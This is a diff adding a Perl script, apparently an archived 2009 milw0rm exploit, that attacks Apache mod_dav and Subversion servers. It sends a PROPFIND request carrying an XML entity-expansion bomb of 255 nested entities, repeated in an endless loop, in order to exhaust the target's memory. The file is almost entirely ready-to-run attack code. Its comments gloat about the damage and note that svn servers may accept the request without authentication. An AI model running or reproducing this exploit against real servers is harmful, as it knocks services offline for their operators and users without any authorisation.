@@ -1,0 +1,101 @@
+###furoffyourcat.pl
+### Apache mod_dav / svn Remote Denial of Service Exploit
+### by kcope / June 2009
+###
+### Will exhaust all system memory
+### Needs Authentication on normal DAV
+###
+### This can be especially serious stuff when used against
+### svn (subversion) servers!! Svn might let the PROPFIND slip through
+### without authentication. bwhahaaha :o)
+### use at your own risk!
+##################################################################
+
+use IO::Socket;
+use MIME::Base64;
+
+sub usage {
+	print "Apache mod_dav / svn Remote Denial of Service Exploit\n";
+	print "by kcope in 2009\n";
+	print "usage: perl furoffyourcat.pl <remotehost> <webdav folder> [username] [password]\n";
+	print "example: perl furoffyourcat.pl svn.XXX.com /projects/\n";exit;
+}
+
+if ($#ARGV < 1) {usage();}
+
+$hostname = $ARGV[0];
+$webdavfile = $ARGV[1];
+
+$username = $ARGV[2];
+$password = $ARGV[3];
+                            
+$|=1;
+
+$BasicAuth = encode_base64("$username:$password");
+chomp $BasicAuth;
+
+my $sock = IO::Socket::INET->new(PeerAddr => $hostname,
+                              PeerPort => 80,
+                              Proto    => 'tcp');
+print $sock "PROPFIND $webdavfile HTTP/1.1\r\n";
+print $sock "Host: $hostname\r\n";
+print $sock "Depth: 0\r\n";
+print $sock "Connection: close\r\n";
+if ($username ne "") {
+print $sock "Authorization: Basic $BasicAuth\r\n";	
+}
+print $sock "\r\n";
+$x = <$sock>;	
+
+print $x;
+if (!($x =~ /207/)) {
+while(<$sock>) {
+	print;	
+}
+close($sock);
+ print "No PROPFIND on this server and path.\n";
+ exit(0);	
+}
+
+$a = "";
+for ($i=1;$i<256;$i++) {		# Here you can increase the XML bomb count
+	$k = $i-1;
+	$a .= "<!ENTITY x$i \"&x$k;&x$k;\">\n"
+}
+
+$igzml = 
+"<?xml version=\"1.0\"?>\n"
+."<!DOCTYPE REMOTE [\n"
+."<!ELEMENT REMOTE ANY>\n"
+."<!ENTITY x0 \"foobar\">\n"
+.$a
+."]>\n"
+."<REMOTE>\n"
+."&x$k;\n"
+."</REMOTE>\n";
+
+print "Apache mod_dav / svn Remote Denial of Service Exploit\n";
+print "by kcope in 2009\n";
+print "Launching DoS Attack...\n";
+
+$ExploitRequest =
+ "PROPFIND $webdavfile HTTP/1.1\r\n"
+."Host: $hostname\r\n"
+."Depth: 0\r\n";
+
+if ($username ne "") {
+$ExploitRequest .= "Authorization: Basic $BasicAuth\r\n";	
+}
+$ExploitRequest .= "Content-Type: text/xml\r\nContent-Length: ".length($igzml)."\r\n\r\n" . $igzml;
+
+while(1) {
+again:
+my $sock = IO::Socket::INET->new(PeerAddr => $hostname,
+                              PeerPort => 80,
+                              Proto    => 'tcp') || (goto again);
+
+print $sock $ExploitRequest;
+print ";Pp";
+}
+
+# milw0rm.com [2009-06-01]
